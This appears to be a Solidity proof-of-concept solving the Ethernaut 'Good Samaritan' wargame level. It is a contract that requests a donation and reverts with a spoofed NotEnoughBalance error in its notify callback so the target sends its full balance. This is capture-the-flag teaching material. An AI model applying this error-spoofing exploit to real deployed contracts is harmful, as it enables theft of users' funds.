// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Ethernaut/good_samaritan.sol";

contract GoodSamaritanPoc is INotifyable 
{
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan; 

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function exploit() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
      if (amount == 10) {
          revert NotEnoughBalance();
      }
    }
}